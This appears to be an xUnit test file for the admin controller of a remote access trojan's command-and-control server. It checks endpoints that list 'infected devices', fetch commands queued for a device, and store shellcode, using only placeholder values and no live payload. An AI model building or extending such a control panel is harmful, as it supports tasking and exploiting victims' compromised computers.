using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Options;
using Rat_Server.Controllers;
using Rat_Server.Model;
using Rat_Server.Model.Context;
using Rat_Server.Model.Entities;
using System.Text;
using Xunit.Abstractions;
using Microsoft.Extensions.Configuration;
using Microsoft.VisualStudio.TestPlatform.TestHost;
using MySqlX.XDevAPI.Common;
using Rat_Server.Model.DTOs;
using Microsoft.AspNetCore.Http;

namespace Controller_Tests
{
    public class AdminControllerTest: BaseControllerTest
    {
        protected readonly AdminController _controller;

        public AdminControllerTest(ITestOutputHelper output) : base(output) 
        {
            _controller = new AdminController(_context);
        }

        [Fact]
        public async void TestGetAllInfectedDevices()
        {
            List<Device> infectedDevices = await _context.Devices.ToListAsync();
            var result = await _controller.GetAllInfectedDevices();
            var resultContent = GetObjectResultValue<List<Device>>(result);

            Assert.IsType<OkObjectResult>(result.Result);
            Assert.NotNull(resultContent);
            Assert.True(resultContent.Count == infectedDevices.Count);
            
            for(int i = 0; i < infectedDevices.Count; i++)
            {
                Assert.Equal(resultContent[i].Hwid, infectedDevices[i].Hwid);
            }
        }

        [Fact]
        public async void TestGetDeviceCommands()
        {
            Device devicePlaceholder = await CreateDevicePlaceholder(Guid.NewGuid(), Guid.NewGuid().ToString());
            List<Command> commandPlaceholders = [];
            
            for (int i = 0; i < 10; i++)
            {
                commandPlaceholders.Add(await CreateCommandPlaceholder(devicePlaceholder, $"Test Command {i}"));
            }

            var actionResult = await _controller.GetDeviceCommands(devicePlaceholder.Hwid);
            Assert.NotNull(actionResult.Result);
            Assert.IsType<OkObjectResult>(actionResult.Result);

            var responseValue = GetObjectResultValue<List<Command>>(actionResult.Result);
            Assert.IsType<List<Command>>(responseValue);
            Assert.Equal(responseValue.Count, commandPlaceholders.Count);

            for (int i = 0; i < responseValue.Count; i++)
            {
                Command? c = commandPlaceholders.Find(c => c.commandId.Equals(responseValue[i].commandId));
                Assert.NotNull(c);
                Assert.Equal(responseValue[i].DevicedHwid, c.DevicedHwid);
                Assert.Equal(responseValue[i].CommandValue, c.CommandValue);
                Assert.Equal(responseValue[i].DateAdded, c.DateAdded);
            }

            foreach(Command c in commandPlaceholders)
            {
                _context.Commands.Remove(c);
            }

            _context.Devices.Remove(devicePlaceholder);
            await _context.SaveChangesAsync();
        }

        [Fact]
        private async void TestGetAllShellCode()
        {
            List<ShellCode> shellCodeEntities = await _context.ShellCodes.ToListAsync();
            var result = await _controller.GetAllShellCode();
            var resultContent = GetObjectResultValue<List<ShellCodeDto>>(result);

            Assert.IsType<OkObjectResult>(result.Result);
            Assert.NotNull(resultContent);
            Assert.True(resultContent.Count == shellCodeEntities.Count);

            for (int i = 0; i < shellCodeEntities.Count; i++)
            {
                Assert.Equal(resultContent[i].Name, shellCodeEntities[i].Name);
                Assert.Equal(resultContent[i].Code, shellCodeEntities[i].Code);
            }
        }

        [Fact]
        private async void TestAddShellCode()
        {
            // Test adding shellcode with a name that already exists
            ShellCode shellCodePlaceholder = await CreateShellCodePlaceholder("ShellCode Placeholder", "ffffffffffffffff");
            var result = await _controller.AddShellCode(new ShellCodeDto
            {
                Code = shellCodePlaceholder.Code,
                Name = shellCodePlaceholder.Name
            });
            
            Assert.IsType<ConflictObjectResult>(result.Result);
            
            _context.Remove(shellCodePlaceholder);
            await _context.SaveChangesAsync();

            // Test adding ShellCode with a name that doesn't exist
            result = await _controller.AddShellCode(new ShellCodeDto
            {
                Name = "ShellCode Placeholder",
                Code = "ffffffffffffffff"
            });

            Assert.NotNull(result.Result);
            Assert.IsType<CreatedResult>(result.Result);

            // Make sure the shellcode we just added with AddShellCode is actually in the database
            ShellCode? addedShellCode = await _context.ShellCodes.SingleOrDefaultAsync(c => c.Name.Equals("ShellCode Placeholder"));
            Assert.NotNull(addedShellCode);

            _context.Remove(addedShellCode);
            await _context.SaveChangesAsync();
        }
    }
}